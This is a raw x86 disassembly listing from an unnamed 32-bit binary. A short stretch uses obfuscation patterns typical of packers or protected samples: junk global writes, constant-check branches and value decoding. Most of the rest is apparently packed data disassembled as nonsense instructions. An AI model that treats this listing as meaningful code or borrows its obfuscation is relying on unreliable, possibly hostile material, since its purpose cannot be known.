  407241:	jno    0x40724d
  407243:	mov    ebx,edx
  407245:	sbb    cl,BYTE PTR [ebp+0x35c66c95]
  40724b:	mov    DWORD PTR [ebp-0x2c],0x4f39
  407252:	mov    DWORD PTR ds:0x43456f,0x15ae
  40725c:	cmp    eax,DWORD PTR [edx]
  40725e:	mov    DWORD PTR ds:0x43455f,0x344d
  407268:	je     0x40836f
  40726e:	mov    DWORD PTR [ebp-0xc],0x705fd8c
  407275:	lea    eax,[ebp-0xc]
  407278:	add    DWORD PTR ds:0x434693,0x434563
  407282:	mov    DWORD PTR [ebp-0x10],eax
  407285:	xor    eax,DWORD PTR ds:0x434587
  40728b:	mov    eax,DWORD PTR [ebp-0x10]
  40728e:	not    edx
  407290:	mov    edx,DWORD PTR [eax]
  407292:	or     DWORD PTR ds:0x43457b,0x7c2e
  40729c:	imul   edx,edx,0xf89ea9ed
  4072a2:	mov    DWORD PTR ds:0x4345cb,0x5d50
  4072ac:	mov    DWORD PTR [eax],edx
  4072ae:	mov    DWORD PTR ds:0x4345bb,0x7ba0
  4072b8:	mov    eax,DWORD PTR [ebp-0xc]
  4072bb:	cmp    eax,0x9155269c
  4072c0:	je     0x4076db
  4072c6:	mov    edi,DWORD PTR ds:0x43466f
  4072cc:	mov    eax,ds:0x4346b3
  4072d1:	sub    eax,edi
  4072d3:	sub    edi,DWORD PTR [edi+eax*1]
  4072d6:	mov    eax,DWORD PTR [ebp-0x1c]
  4072d9:	or     DWORD PTR [eax],0x60751c9d
  4072df:	mov    eax,DWORD PTR [ebp-0x8]
  4072e2:	xor    eax,ecx
  4072e4:	add    eax,esi
  4072e6:	pop    edi
  4072e7:	pop    esi
  4072e8:	jmp    0x4076d6
  4072ed:	pop    ds
  4072ee:	add    al,0x2a
  4072f0:	or     eax,0x2c313d35
  4072f5:	add    eax,0xb3907a48
  4072fa:	push   ss
  4072fb:	ret    
  4072fc:	sar    DWORD PTR [edi],cl
  4072fe:	iret   
  4072ff:	jle    0x40737f
  407301:	dec    edi
  407302:	jns    0x407382
  407304:	jle    0x40735f
  407306:	mov    ch,0x68
  407308:	xchg   ah,bh
  40730a:	cdq    
  40730b:	sub    BYTE PTR [eax-0x79],al
  40730e:	inc    esp
  40730f:	(bad)  
  407310:	xchg   edx,eax
  407311:	jbe    0x407313
  407313:	sbb    DWORD PTR [edi-0x587d52c],0x8eac0505
  40731d:	mov    al,ds:0xa0c25d68
  407322:	mov    DWORD PTR [edi-0x73d32a89],0xcc155b79
  40732c:	xor    DWORD PTR [eax],ebx
  40732e:	fcom   DWORD PTR [edi+0x1e0c3e6f]
  407334:	leave  
  407335:	lds    esp,FWORD PTR [edi+esi*2+0x6e]
  407339:	loope  0x407308
  40733b:	idiv   edx
  40733d:	xchg   esi,eax
  40733e:	adc    DWORD PTR [esi-0x7997426e],0xffffff9b
  407345:	call   0x24679f14
  40734a:	dec    esi
  40734b:	popf   
  40734c:	mov    esi,0x2be2d5b4
  407351:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407352:	hlt    
  407353:	es retf 0x5fc4
  407357:	inc    edx
  407358:	push   esi
  407359:	xchg   ebx,eax
  40735a:	rcl    DWORD PTR ds:0xdae918ed,0xc0
  407361:	mov    dh,0x1d
  407363:	jle    0x4073a1
  407365:	call   0x5f17:0x6dc3f467
  40736c:	mov    edx,0xcc4a9ae3
  407371:	outs   dx,BYTE PTR ds:[esi]
  407372:	pop    es
  407373:	out    0x2b,eax
  407375:	ret    0x7ee7
  407378:	lods   eax,DWORD PTR ds:[esi]
  407379:	xor    ch,BYTE PTR [edi-0x1d87a024]
  40737f:	test   DWORD PTR [edx],ecx
  407381:	jmp    FWORD PTR [esi-0x3e3a79fb]
  407387:	cmp    edi,ebp
  407389:	enter  0xb075,0x0
  40738d:	stc    
  40738e:	sub    DWORD PTR [eax+0x60],esi
  407391:	out    dx,eax
  407392:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407393:	xchg   esi,eax
  407394:	pop    eax
  407395:	and    bl,0xb5
  407398:	loop   0x4073d5
  40739a:	or     esi,edx
  40739c:	inc    ecx
  40739d:	mov    eax,0xf4a5b98b
  4073a2:	pop    ecx
  4073a3:	pop    ecx
  4073a4:	aaa    
  4073a5:	add    eax,0x129fddc
  4073aa:	mov    eax,ds:0x583c4e93
  4073af:	and    ah,BYTE PTR [ebx]
  4073b1:	mov    ebp,0x1e74700
  4073b6:	adc    dh,BYTE PTR [eax-0x1893a5c]
  4073bc:	push   ds
  4073bd:	push   ss
  4073be:	mov    al,0xe8
  4073c0:	loope  0x40734c
  4073c2:	and    eax,DWORD PTR [edi]
  4073c4:	or     DWORD PTR [ebx+0x13476870],esp
  4073ca:	mov    bl,0x6b
  4073cc:	inc    edi
  4073cd:	or     BYTE PTR [ecx+0x6],bl
  4073d0:	sbb    bl,BYTE PTR [ebp+0x1bf9b254]
  4073d6:	mov    ds:0xb7e7a3a,al
  4073db:	jb     0x40745a
  4073dd:	fistp  WORD PTR [ecx]
  4073df:	popf   
  4073e0:	aam    0x16
  4073e2:	jle    0x4073ba
  4073e4:	xchg   ecx,eax
  4073e5:	outs   dx,BYTE PTR ds:[esi]
  4073e6:	adc    eax,0xb4e3cbd3
  4073eb:	fld    DWORD PTR [esi-0x1206ccdd]
  4073f1:	pop    ebp
  4073f2:	outs   dx,BYTE PTR ds:[esi]
  4073f3:	and    dh,BYTE PTR [eax]
  4073f5:	xchg   esp,eax
  4073f6:	fwait
  4073f7:	pop    eax
  4073f8:	popf   
  4073f9:	shl    DWORD PTR [ecx-0x19893a8c],cl
  4073ff:	(bad)  
  407402:	inc    ebx
  407403:	mov    cl,0x68
  407405:	fidiv  WORD PTR [edx]
  407407:	adc    al,BYTE PTR ds:0x2c98d5f0
  40740d:	out    dx,eax
  40740e:	xchg   esp,eax
  40740f:	mov    dl,0x7b
  407411:	sbb    BYTE PTR [eax],dl
  407413:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407414:	icebp  
  407415:	sbb    al,0x63
  407417:	in     eax,dx
  407418:	idiv   cl
  40741a:	or     ecx,esp
  40741c:	mov    cl,bl
  40741e:	loopne 0x4073fe
  407420:	ja     0x407489
  407422:	xor    cl,BYTE PTR [edx+0x2e27012a]
  407428:	lods   eax,DWORD PTR ds:[esi]
  407429:	test   al,0x2c
  40742b:	cmp    dl,BYTE PTR [ebx+eiz*2+0x46]
  40742f:	stos   DWORD PTR es:[edi],eax
  407430:	test   DWORD PTR [eax+edi*8+0x4478d6e5],0xfd9e781f
  40743b:	inc    esp
  40743c:	fsub   QWORD PTR [eax+edi*8]
  40743f:	add    ah,BYTE PTR [esi+0x2c]
  407442:	mov    edi,0x1a08ab54
  407447:	in     al,0xa6
  407449:	leave  
  40744a:	shl    DWORD PTR [ebx-0x4a],0x92
  40744e:	xor    bh,BYTE PTR [edx+0x23]
  407451:	pop    esp
  407452:	xlat   BYTE PTR ds:[ebx]
  407453:	sbb    DWORD PTR [edx-0x7f9e1d85],edx
  407459:	es or  esi,edx
  40745c:	jns    0x40745a
  40745e:	cmc    
  40745f:	in     al,0x2f
  407461:	push   ebx
  407462:	dec    esi
  407463:	aas    
  407464:	sbb    dl,ah
  407466:	dec    esp
  407467:	out    dx,al
  407468:	push   cs
  407469:	fnstcw WORD PTR [esi+0x61]
  40746c:	mov    esi,0xee47a028
  407471:	leave  
  407472:	push   cs
  407473:	fld    DWORD PTR [esi]
  407475:	or     DWORD PTR [esi+eiz*2-0x13],edx
  407479:	dec    edi
  40747a:	xor    dh,BYTE PTR [ecx+0x2c5df055]
  407480:	test   eax,0xda42bc98
  407485:	aad    0xb7
  407487:	les    edi,FWORD PTR [eax+0x768a24c6]
  40748d:	idiv   DWORD PTR [eax+0x58]
  407490:	adc    ch,al
  407492:	mov    bl,0x56
  407494:	or     bh,bh
  407496:	bound  edx,QWORD PTR [esi+0x50]
  407499:	or     dl,BYTE PTR [edi+0x37]
  40749c:	lahf   
  40749d:	inc    ebx
  40749e:	clc    
  40749f:	js     0x4074fe
  4074a1:	imul   esi,edi,0x38d6fe04
  4074a7:	mov    BYTE PTR [ebx-0x40eb56e3],ch
  4074ad:	add    DWORD PTR [ebx-0x6070b381],esi
  4074b3:	out    dx,al
  4074b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074b5:	pushf  
  4074b6:	outs   dx,BYTE PTR ds:[esi]
  4074b7:	jns    0x407460
  4074b9:	sub    DWORD PTR [edx-0x11b41ae6],esp
  4074bf:	loop   0x407486
  4074c1:	scas   al,BYTE PTR es:[edi]
  4074c2:	add    ebx,DWORD PTR [edx-0x270bb568]
  4074c8:	xlat   BYTE PTR ds:[ebx]
  4074c9:	add    bh,BYTE PTR [ecx-0xa]
  4074cc:	jo     0x40753d
  4074ce:	test   DWORD PTR ds:0x8b16a60f,eax
  4074d4:	rol    DWORD PTR [edi],cl
  4074d6:	mov    ss,WORD PTR [edx+eiz*4-0x52]
  4074da:	pop    ebx
  4074db:	inc    eax
  4074dc:	loop   0x40755d
  4074de:	lods   al,BYTE PTR ds:[esi]
  4074df:	ja     0x4074bd
  4074e1:	or     ecx,DWORD PTR [eax]
  4074e3:	and    eax,0xb38f6ace
  4074e8:	mov    bh,0x7d
  4074ea:	jge    0x40752b
  4074ec:	pop    edi
  4074ed:	jmp    0x40749c
  4074ef:	mov    esi,0x1c307528
  4074f4:	les    edx,FWORD PTR [eax+0x7a8b9ea5]
  4074fa:	inc    esi
  4074fb:	into   
  4074fc:	jp     0x407502
  4074fe:	pop    ebx
  4074ff:	test   BYTE PTR [esi],cl
  407501:	aad    0xce
  407503:	mov    eax,ds:0x235740ff
  407508:	push   esi
  407509:	pop    esp
  40750a:	cmp    ebp,DWORD PTR [eax]
  40750c:	hlt    
  40750d:	popa   
  40750e:	mov    bh,0xaa
  407510:	adc    DWORD PTR [edx-0x77],0x4c
  407514:	xor    cl,BYTE PTR [edx-0x6a]
  407517:	adc    eax,0xf9be9b65
  40751c:	fisub  WORD PTR fs:[ecx-0x57]
  407520:	fmul   st,st(7)
  407522:	cs call 0xaa05f8e2
  407528:	push   eax
  407529:	mov    ?,WORD PTR [ecx-0x1041b072]
  40752f:	rcl    bl,cl
  407531:	fild   QWORD PTR [eax-0x1c90f559]
  407537:	daa    
  407538:	cmc    
  407539:	outs   dx,DWORD PTR ds:[esi]
  40753a:	aaa    
  40753b:	push   ss
  40753c:	call   FWORD PTR [eax+edi*1-0x3c]
  407540:	shl    BYTE PTR [ebx-0xd],1
  407543:	mov    BYTE PTR [edx+0x1f],0xf9
  407547:	mov    edi,0xc452f0dd
  40754c:	jno    0x407513
  40754e:	mov    ebp,0x80bb1918
  407553:	push   edi
  407554:	inc    eax
  407555:	adc    eax,0x7b192ed5
  40755a:	xchg   edx,eax
  40755b:	fwait
  40755c:	loope  0x40754e
  40755e:	gs sti 
  407560:	or     al,0x91
  407562:	dec    ebp
  407563:	int3   
  407564:	adc    bh,BYTE PTR [ebx]
  407566:	mov    eax,0x7bfa97be
  40756b:	push   ebp
  40756c:	pop    ecx
  40756d:	inc    ecx
  40756e:	xor    DWORD PTR [ebx],ecx
  407570:	mov    dl,0xad
  407572:	lods   eax,DWORD PTR ds:[esi]
  407573:	and    BYTE PTR [eax],bh
  407575:	jle    0x40751a
  407577:	adc    BYTE PTR [eax-0xf36e25a],dh
  40757d:	or     DWORD PTR [edi-0x43cdb60b],ebp
  407583:	gs jmp 0x407603
  407586:	pop    edi
  407587:	mov    bh,0x72
  407589:	adc    al,0xec
  40758b:	push   ecx
  40758c:	bound  esp,QWORD PTR [edx+edx*2-0x77]
  407590:	jb     0x40759a
  407592:	pop    es
  407593:	or     esp,DWORD PTR [ebx-0x6c]
  407596:	aad    0x78
  407598:	fld    DWORD PTR [ebx+edx*8+0x2408bd9b]
  40759f:	push   ecx
  4075a0:	cmp    esp,DWORD PTR [edx-0x31]
  4075a3:	int    0xae
  4075a5:	xchg   ecx,eax
  4075a6:	sahf   
  4075a7:	push   esp
  4075a8:	adc    DWORD PTR [edx-0x3b4cb9ab],ebx
  4075ae:	pop    ss
  4075af:	mov    edi,0x8cffaa7c
  4075b4:	dec    eax
  4075b5:	sar    esi,0x3f
  4075b8:	dec    eax
  4075b9:	inc    esi
  4075ba:	sti    
  4075bb:	mov    ebx,0x217980ca
  4075c0:	push   cs
  4075c1:	jo     0x407600
  4075c3:	fwait
  4075c4:	or     BYTE PTR [eax+0xcef237d],cl
  4075ca:	inc    ecx
  4075cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075cc:	push   eax
  4075cd:	int3   
  4075ce:	cld    
  4075cf:	cs xchg esi,eax
  4075d1:	jp     0x407568
  4075d3:	gs int3 
  4075d5:	mov    al,ds:0x25fa7b3e
  4075da:	mov    eax,0x11bd3ef3
  4075df:	rol    BYTE PTR [ebx-0x36],1
  4075e2:	outs   dx,BYTE PTR ds:[esi]
  4075e3:	dec    esi
  4075e4:	je     0x407611
  4075e6:	cmp    edx,esp
  4075e8:	clc    
  4075e9:	fnop   
  4075eb:	call   0x9f5b:0xfb7a4900
  4075f2:	sub    DWORD PTR [ebx-0x36],ecx
  4075f5:	jno    0x407634
  4075f7:	xchg   ebp,eax
  4075f8:	pop    ds
  4075f9:	repnz pop ebx
  4075fb:	xor    dl,al
  4075fd:	mov    WORD PTR [ebp+0x3e75302],es
  407603:	jmp    0x40762b
  407605:	add    DWORD PTR [esi],ecx
  407607:	nop
  407608:	or     DWORD PTR [edx],ebx
  40760a:	mov    WORD PTR [edx-0x36e8014d],gs
  407610:	imul   DWORD PTR [eax+0x6a1ee13f]
  407616:	fs leave 
  407618:	mov    ebx,0x78fc861d
  40761d:	sbb    eax,0xbf9aa95c
  407622:	leave  
  407623:	adc    al,0x93
  407625:	xor    ah,dh
  407627:	shr    BYTE PTR [edx+0x19],0x28
  40762b:	and    ah,BYTE PTR [edx+0xe]
  40762e:	add    eax,0x9b1ebf3f
  407633:	out    0x6a,eax
  407635:	add    ch,BYTE PTR [edx-0x43]
  407638:	loope  0x40765a
  40763a:	repnz xchg esp,eax
  40763c:	cli    
  40763d:	sbb    ebx,DWORD PTR [edx+0x7e51ccbd]
  407643:	adc    DWORD PTR [edx-0x577a56e1],edi
  407649:	jl     0x407688
  40764b:	in     eax,dx
  40764c:	sbb    DWORD PTR [edi],0x17
  40764f:	pop    ss
  407650:	cwde   
  407651:	cs inc edi
  407653:	aaa    
  407654:	push   ebx
  407655:	imul   esp,esp,0x22
  407658:	repz pop ds
  40765a:	(bad)  
  40765c:	jg     0x407684
  40765e:	pusha  
  40765f:	sub    BYTE PTR [esi],bl
  407661:	aas    
  407662:	mov    ecx,0xe184324c
  407667:	fmul   DWORD PTR [ecx+0x7f9d713f]
  40766d:	fild   WORD PTR [ebx+0x44]
  407670:	pop    ecx
  407671:	lods   al,BYTE PTR ds:[esi]
  407672:	xchg   edx,eax
  407673:	pop    esi
  407674:	add    dl,dh
  407676:	push   esp
  407677:	div    BYTE PTR [esi]
  407679:	out    0xb7,eax
  40767b:	dec    eax
  40767c:	push   ss
  40767d:	push   ebx
  40767e:	cmc    
  40767f:	push   esi
  407680:	and    eax,0xf6bc03cb
  407685:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407686:	out    dx,al
  407687:	(bad)  
  407688:	aam    0x42
  40768a:	xchg   esi,eax
  40768b:	cwde   
  40768c:	test   al,0x20
  40768e:	nop
  40768f:	shl    BYTE PTR [eax],cl
  407691:	ds adc eax,0xfdb77c0f
  407697:	ja     0x4076c2
  407699:	addr16 jmp 0x4e7a6c57
  40769f:	mov    ds:0x9e195cb8,al
  4076a4:	xchg   esi,eax
  4076a5:	addr16 jg 0x4076dc
  4076a8:	sbb    BYTE PTR [esi],ch
  4076aa:	adc    al,0x8a
  4076ac:	pop    ebx
  4076ad:	xor    eax,0x6ac18f4c
  4076b2:	nop
  4076b3:	pop    ds
  4076b4:	cmc    
  4076b5:	icebp  
  4076b6:	dec    edi
  4076b7:	inc    ebx
  4076b8:	mov    gs,WORD PTR [ebx]
  4076ba:	dec    ebp
  4076bb:	xor    al,0x39
  4076bd:	std    
  4076be:	jns    0x407721
  4076c0:	cld    
  4076c1:	add    ebx,DWORD PTR [edx+0x71cc1dd]
  4076c7:	sbb    ah,bl
  4076c9:	mov    esp,0x94a47a11
  4076ce:	rcr    cl,cl
  4076d0:	or     BYTE PTR [edx+0x668c7c49],ah
  4076d6:	pop    ebx
  4076d7:	leave  
  4076d8:	ret    0x4
  4076db:	mov    eax,DWORD PTR [ebp-0xc]
  4076de:	add    eax,DWORD PTR [ebp-0x18]
  4076e1:	cmp    eax,0x89f4544a
  4076e6:	je     0x4076fa
  4076ec:	mov    eax,DWORD PTR [ebp-0x10]
  4076ef:	and    DWORD PTR [eax],0x751c9e
  4076f5:	jmp    0x4072df
  4076fa:	mov    eax,DWORD PTR [ebp-0xc]
  4076fd:	mov    edx,DWORD PTR [ebp-0x18]
  407700:	or     eax,edx
  407702:	cmp    eax,0xf9df2fbe
  407707:	je     0x407b09
  40770d:	jmp    0x407afb
  407712:	ret    
  407713:	or     esi,DWORD PTR [ebx+eiz*1+0x7c]
  407717:	ins    DWORD PTR es:[edi],dx
  407718:	pop    ebp
  407719:	jmp    0x407762
  40771b:	(bad)  
  40771c:	pop    ecx
  40771d:	sbb    eax,0x67df9b1f
  407722:	or     bl,cl
  407724:	jle    0x4077a4
  407726:	dec    edi
  407727:	jns    0x4077a7
  407729:	jle    0x4076e3
  40772b:	iret   
  40772c:	fisubr DWORD PTR [ecx-0x5e2c19f]
  407732:	out    0x1f,al
  407734:	es repz inc edx
  407737:	inc    BYTE PTR ds:0x429c0126
  40773d:	iret   
  40773e:	dec    esp
  40773f:	sub    BYTE PTR [ebp*2+0x7a31ba67],ah
  407746:	ds xchg ebx,eax
  407748:	mov    ds:0xc37d7878,eax
  40774d:	addr16 sahf 
  40774f:	push   ds
  407750:	and    edx,DWORD PTR [edx+0x13bf82e]
  407756:	iret   
  407757:	in     al,0xd
  407759:	inc    eax
  40775a:	mov    dh,0x29
  40775c:	sub    DWORD PTR [ecx-0x4ed7d9d5],0x68389967
  407766:	mov    cl,0xc5
  407768:	rol    BYTE PTR [edx],cl
  40776a:	lods   eax,DWORD PTR ds:[esi]
  40776b:	dec    esp
  40776c:	push   0x52da9cd8
  407771:	and    al,BYTE PTR [ecx]
  407773:	dec    ebp
  407774:	mov    ebp,0x3773c628
  407779:	or     DWORD PTR [ebp+0x5e967503],0x3b
  407780:	xor    cl,bh
  407782:	mov    ebp,0x452b6536
  407787:	js     0x4077a4
  407789:	aaa    
  40778a:	icebp  
  40778b:	cmp    eax,0xcebb091d
  407790:	mov    al,ds:0x2e6e838b
  407795:	pop    edx
  407796:	scas   eax,DWORD PTR es:[edi]
  407797:	in     eax,0x27
  407799:	and    DWORD PTR [eax-0x545eff6e],ebp
  40779f:	jmp    0xed0e8f2
  4077a4:	rcr    BYTE PTR [edi+0x45],cl
  4077a7:	mov    al,ds:0x1b081b05
  4077ac:	xchg   BYTE PTR [ebp-0x74],cl
  4077af:	xlat   BYTE PTR ds:[ebx]
  4077b0:	loope  0x40781a
  4077b2:	sub    edi,esi
  4077b4:	stc    
  4077b5:	rol    DWORD PTR [edi-0x193869e2],1
  4077bb:	mov    DWORD PTR [edx],edi
  4077bd:	jle    0x407806
  4077bf:	test   DWORD PTR [esp+eax*8],esp
  4077c2:	xor    ebx,DWORD PTR fs:[edx+0x2f]
  4077c6:	fmul   DWORD PTR [eax]
  4077c8:	int    0x39
  4077ca:	push   ds
  4077cb:	push   ss
  4077cc:	inc    esi
  4077ce:	(bad)  
  4077cf:	cdq    
  4077d0:	stos   DWORD PTR es:[edi],eax
  4077d1:	repnz and bh,cl
  4077d4:	fist   DWORD PTR [ecx+0x28]
  4077d7:	sbb    esi,DWORD PTR [ebp-0x23]
  4077da:	or     esi,DWORD PTR [si+0x2d]
  4077de:	sub    BYTE PTR [edx+0x39c42892],al
  4077e4:	addr16 ds adc al,0x6e
  4077e8:	mov    al,ds:0x11a73bab
  4077ed:	add    al,0x68
  4077ef:	out    0xfa,eax
  4077f1:	shl    BYTE PTR [ebx],cl
  4077f3:	in     eax,0xb3
  4077f5:	jae    0x407839
  4077f7:	xor    eax,0x774bf8c0
  4077fc:	xchg   BYTE PTR [ebx-0x5d469bcd],al
  407802:	jl     0x407872
  407804:	or     al,ah
  407806:	push   cs
  407807:	jmp    0x6fd0:0x91a3c7a8
  40780e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40780f:	imul   ecx,DWORD PTR [eax+ecx*4+0x31bb4bf2],0x4aa1ca2c
  40781a:	cli    
  40781b:	mov    dl,0xa5
  40781d:	aas    
  40781e:	sbb    DWORD PTR [edi+0x56],ebx
  407821:	cmp    ch,BYTE PTR [ecx+edi*1+0x7ce133f9]
  407828:	push   edx
  407829:	mov    ebx,0x9ee6380f
  40782e:	nop
  40782f:	xrstor [esi]
  407832:	xchg   ecx,eax
  407833:	sbb    al,BYTE PTR [esi+edi*2+0x2f224626]
  40783a:	lods   eax,DWORD PTR ds:[esi]
  40783b:	inc    eax
  40783c:	fcmovbe st,st(2)
  40783e:	stc    
  40783f:	jg     0x407823
  407841:	dec    ecx
  407842:	cld    
  407843:	mov    ebp,0x88e85cbd
  407848:	adc    eax,DWORD PTR [ebp+0x4ebf6d4]
  40784e:	sbb    dh,BYTE PTR [ebp+0xfcb83f7]
  407854:	mov    BYTE PTR [esi-0xdc997b5],bh
  40785a:	mov    ds:0x24b4b38b,al
  40785f:	cmp    bl,BYTE PTR [edx+0x4e]
  407862:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407863:	hlt    
  407864:	jg     0x407892
  407866:	int    0x1
  407868:	mov    ds:0x59f43e20,al
  40786d:	mov    bh,0xeb
  40786f:	cli    
  407870:	ins    BYTE PTR es:[edi],dx
  407871:	mov    dl,0xba
  407873:	std    
  407874:	add    al,0x32
  407876:	pop    ebx
  407877:	fisub  WORD PTR [esi]
  407879:	add    BYTE PTR [eax-0x14],dh
  40787c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40787d:	sti    
  40787e:	cmp    eax,0xd68de22d
  407883:	or     al,0x52
  407885:	inc    esi
  407886:	js     0x4078e8
  407888:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407889:	shl    dh,0x1d
  40788c:	pop    es
  40788d:	mov    bh,0x4a
  40788f:	mov    al,0xe
  407891:	shr    edx,0xb4
  407894:	pop    esp
  407895:	in     eax,0xd0
  407897:	cmp    al,0x7b
  407899:	shl    cl,1
  40789b:	(bad)  
  40789c:	daa    
  40789d:	push   ebp
  40789e:	jecxz  0x407919
  4078a0:	inc    edi
  4078a1:	rcl    cl,1
  4078a3:	jge    0x40783c
  4078a5:	test   BYTE PTR [edx+edi*1],0x32
  4078a9:	mov    DWORD PTR [edx-0xc224bc2],eax
  4078af:	arpl   WORD PTR [ecx],dx
  4078b1:	push   ecx
  4078b2:	test   BYTE PTR [edi+edi*4],0x31
  4078b6:	pop    ebx
  4078b7:	pop    ss
  4078b8:	jmp    0xfa08:0x26b0cdc1
  4078bf:	dec    edx
  4078c0:	and    al,0x27
  4078c2:	push   0x68ff0430
  4078c7:	jae    0x40789e
  4078c9:	mov    dl,0xe5
  4078cb:	fldenv [edi+0x39]
  4078ce:	pop    ebx
  4078cf:	int    0xc2
  4078d1:	mov    ds:0xed7d7441,al
  4078d6:	ins    DWORD PTR es:[edi],dx
  4078d7:	jns    0x40790c
  4078d9:	xchg   edi,eax
  4078da:	mov    bl,0xb7
  4078dc:	es leave 
  4078de:	jl     0x407893
  4078e0:	hlt    
  4078e1:	fistp  DWORD PTR [ebx+0x7edbe073]
  4078e7:	retf   
  4078e8:	adc    esi,ecx
  4078ea:	mov    DWORD PTR [ebx],ecx
  4078ec:	and    dl,BYTE PTR [eax]
  4078ee:	add    DWORD PTR [ecx-0x3a],ebp
  4078f1:	mov    esp,0x1bad7933
  4078f6:	xchg   edx,eax
  4078f7:	cmc    
  4078f8:	and    eax,0x71ea917b
  4078fd:	sbb    al,BYTE PTR [ebx-0x6d]
  407900:	ds (bad) 
  407902:	adc    dl,BYTE PTR [edx+0x56]
  407905:	mov    al,ds:0x45248c39
  40790a:	aad    0x7a
  40790c:	cwde   
  40790d:	hlt    
  40790e:	mov    DWORD PTR [ebp-0x59],esi
  407911:	mov    al,0xc0
  407913:	das    
  407914:	pop    ebx
  407915:	scas   eax,DWORD PTR es:[edi]
  407916:	(bad)  
  407917:	retf   
  407918:	add    ah,bh
  40791a:	cdq    
  40791b:	adc    bl,BYTE PTR [ebx]
  40791d:	sub    ah,BYTE PTR [eax]
  40791f:	sbb    DWORD PTR [ecx],esp
  407921:	or     eax,0xb1a87be9
  407926:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407927:	dec    esp
  407928:	cli    
  407929:	int    0xa0
  40792b:	in     al,dx
  40792c:	dec    ebx
  40792d:	sar    ebx,1
  40792f:	mov    ah,0x4b
  407931:	(bad)  
  407932:	mov    bh,0x50
  407934:	pushf  
  407935:	sub    cl,BYTE PTR [ebp-0x1a01980f]
  40793b:	adc    eax,DWORD PTR [ebp-0x28]
  40793e:	add    esp,ebx
  407940:	jne    0x4078c9
  407942:	dec    ecx
  407943:	xchg   esi,eax
  407944:	inc    ebp
  407945:	arpl   WORD PTR [ebp+0x76],si
  407948:	adc    bh,BYTE PTR gs:[ebx]
  40794b:	ins    BYTE PTR es:[edi],dx
  40794c:	call   0x1519:0x8c84612f
  407953:	inc    ebx
  407954:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407955:	out    0x1f,al
  407957:	rcl    BYTE PTR [ecx],cl
  407959:	retfw  0x38d8
  40795d:	ds push edx
  40795f:	loop   0x40796e
  407961:	push   edx
  407962:	mov    esp,0xeedd37a2
  407967:	xchg   DWORD PTR [eax+0x38],esi
  40796a:	push   esp
  40796b:	add    bl,BYTE PTR [edx+esi*1+0x37]
  40796f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407970:	jge    0x40794d
  407972:	dec    ebx
  407973:	push   0xffffff8e
  407975:	xchg   edx,eax
  407976:	std    
  407977:	sbb    ch,BYTE PTR [ebx+0x165e0ba3]
  40797d:	call   0x4947d425
  407982:	push   ecx
  407983:	xchg   edx,eax
  407984:	test   BYTE PTR [esi+edi*4],0xe5
  407988:	popf   
  407989:	scas   al,BYTE PTR es:[edi]
  40798a:	fisub  DWORD PTR [ecx+ebp*1+0x1f]
  40798e:	iret   
  40798f:	and    edx,esi
  407991:	mov    esi,0xb8772f71
  407996:	stos   DWORD PTR es:[edi],eax
  407997:	sub    BYTE PTR [ecx-0x4f],0xb1
  40799b:	aaa    
  40799c:	mov    ds:0xdb077a2e,al
  4079a1:	loop   0x4079f2
  4079a3:	xchg   ecx,eax
  4079a4:	pop    ss
  4079a5:	jne    0x407976
  4079a7:	dec    ebx
  4079a8:	out    dx,al
  4079a9:	mov    bl,dh
  4079ab:	aad    0xe5
  4079ad:	sbb    DWORD PTR [edx-0x1f483e50],esi
  4079b3:	and    bl,BYTE PTR [edi]
  4079b5:	pushf  
  4079b6:	push   esi
  4079b7:	adc    al,0x45
  4079b9:	mov    edx,esi
  4079bb:	icebp  
  4079bc:	idiv   ah
  4079be:	out    0x42,al
  4079c0:	xor    BYTE PTR [edx+eax*2-0x4826004d],dl
  4079c7:	into   
  4079c8:	test   eax,0xdfa954af
  4079cd:	add    edx,DWORD PTR [ecx-0x43ad9bc4]
  4079d3:	cld    
  4079d4:	fmul   QWORD PTR [ebp+0x1e979d26]
  4079da:	xor    DWORD PTR es:[ebx-0x657f40c6],eax
  4079e1:	add    cl,BYTE PTR [esi+0x2585476]
  4079e7:	(bad)  
  4079e8:	xchg   DWORD PTR [edx],ebx
  4079ea:	ja     0x4079d4
  4079ec:	int    0xc2
  4079ee:	jo     0x4079f1
  4079f0:	cmp    bl,BYTE PTR [eax+0x6aa99395]
  4079f6:	stc    
  4079f7:	sub    al,0xf9
  4079f9:	sbb    ebp,DWORD PTR [edi]
  4079fb:	push   ss
  4079fc:	or     eax,0x88b7639d
  407a01:	nop
  407a02:	dec    edi
  407a03:	cli    
  407a04:	int3   
  407a05:	hlt    
  407a06:	push   esp
  407a07:	sbb    eax,DWORD PTR [ecx]
  407a09:	jecxz  0x407a4e
  407a0b:	or     BYTE PTR [edx+0x76e94a07],al
  407a11:	bound  edi,QWORD PTR [edi-0x5fc73602]
  407a17:	mov    eax,0x415a2e64
  407a1c:	into   
  407a1d:	xchg   edx,eax
  407a1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a1f:	or     cl,BYTE PTR [ebx]
  407a21:	and    DWORD PTR [ebp+0x2a],eax
  407a24:	xor    eax,0x1ba86313
  407a29:	add    ebx,esi
  407a2b:	(bad)  
  407a2c:	outs   dx,DWORD PTR ds:[esi]
  407a2d:	xchg   ebx,eax
  407a2e:	inc    eax
  407a2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a30:	pop    edi
  407a31:	dec    esp
  407a32:	xor    BYTE PTR [edx+0x6a],0xcd
  407a36:	fmul   DWORD PTR [edi+eiz*2-0x36]
  407a3a:	xor    eax,0x7886be67
  407a3f:	test   eax,0x6eb80d06
  407a44:	sbb    bh,cl
  407a46:	adc    ecx,edi
  407a48:	mov    bh,0xa5
  407a4a:	xor    BYTE PTR [ebx+0x47f412bc],0xd5
  407a51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a52:	fprem  
  407a54:	sub    al,cl
  407a56:	aaa    
